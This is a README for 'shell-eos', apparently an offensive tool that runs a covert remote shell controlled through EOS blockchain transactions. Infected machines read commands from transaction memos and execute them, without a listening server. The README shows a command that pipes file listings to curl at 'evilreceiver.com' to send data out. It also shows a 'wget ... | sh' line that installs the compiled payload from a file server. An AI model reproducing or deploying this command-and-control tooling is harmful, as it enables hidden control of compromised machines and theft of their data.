# shell-eos
Decentralized shell over eos blockchain to send commands by eos blockchain to the shells.

Avoid reverse shell usage , who requires online server listening for connections.

## Run the shell as a payload

Run the command to start the daemon listening in the blockchain address. When receives a new transacion the shell search the command in the memo of transaction to execute it.

`python3 payloads/shell-eos.py eosaccountname accountmaster`

*account master is who the bot obey

Send to a EOS address command line to execute orders

## Execute commands in each listening shell

`python3 payloads/send-eos.py eosaccountname` "ls -lsa | xargs ... | curl https://evilreceiver.com" .... -d {1}

## Publish datasets in a address as a recipient

`python3 payloads/send-eos.py eosaccountname` "data" "separator"

## Compile

`./compile.sh`

## Using as a payload

- Compile

- Upload to your prefered file server

`wget https://yourpreferedserver.com/path | sh`




